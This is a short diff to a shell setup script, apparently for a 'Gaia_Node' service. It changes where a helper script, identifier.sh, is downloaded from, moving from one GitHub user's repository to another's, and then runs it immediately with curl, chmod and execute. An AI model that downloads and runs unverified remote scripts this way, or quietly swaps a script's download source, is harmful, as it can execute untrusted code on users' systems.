@@ -52,7 +52,7 @@ echo "✅ Service started!"
 # Identifier Execution
 echo "🚀 Running Identifier Execution..."
 rm -rf identifier.sh
-curl -s -O https://raw.githubusercontent.com/abhiag/Gaia_Node/main/identifier.sh
+curl -s -O https://raw.githubusercontent.com/yinghao888/Gaia_Node/main/identifier.sh
 chmod +x identifier.sh
 ./identifier.sh
 echo "Identifier Execution Status: $?"  # Shows the exit status of Identifier Execution
